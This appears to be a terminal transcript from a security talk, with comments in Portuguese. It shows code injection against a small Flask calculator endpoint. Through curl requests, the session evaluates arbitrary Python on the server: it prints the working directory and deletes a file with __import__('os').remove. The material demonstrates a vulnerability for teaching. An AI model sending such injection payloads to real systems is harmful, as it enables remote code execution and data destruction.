$ # Comando para rodar:
$ FLASK_APP=calc.py flask run --host 0.0.0.0 --port 1337
[...]

$ # Em outro terminal, mas no mesmo diretório:
$ curl localhost:1337/somar/2/2
{"result":4}
$ curl localhost:1337/somar/2*5/-4
{"result":6}
$ curl 'localhost:1337/somar/__import__("os").getcwd()/""'
{"result":"/home/danilo/code/slides-latex/2018-10-18_Security"}
$ touch some.file # Cria um arquivo
$ ls some.file
some.file
$ curl 'localhost:1337/somar/__import__("os").remove("some.file")or""/""'
$ ls some.file
ls: cannot access 'some.file': No such file or directory
